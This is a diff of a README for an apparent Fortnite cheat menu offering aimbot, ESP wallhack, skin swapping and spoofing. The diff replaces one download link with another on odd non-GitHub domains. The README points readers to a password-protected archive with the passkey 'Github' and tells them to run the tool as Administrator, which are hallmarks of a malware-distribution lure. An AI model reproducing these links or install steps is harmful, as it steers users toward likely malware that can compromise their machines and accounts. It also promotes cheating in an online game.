@@ -6,7 +6,7 @@ Fortnite external menu with skin swapper, ESP wallhack, aimbot, unlock all cosme
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -92,7 +92,7 @@ Based on community projects like **Saturn Swapper**, **Perm Spoofer**, and **For
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Fortnite.
 4. Run the menu **as Administrator**.
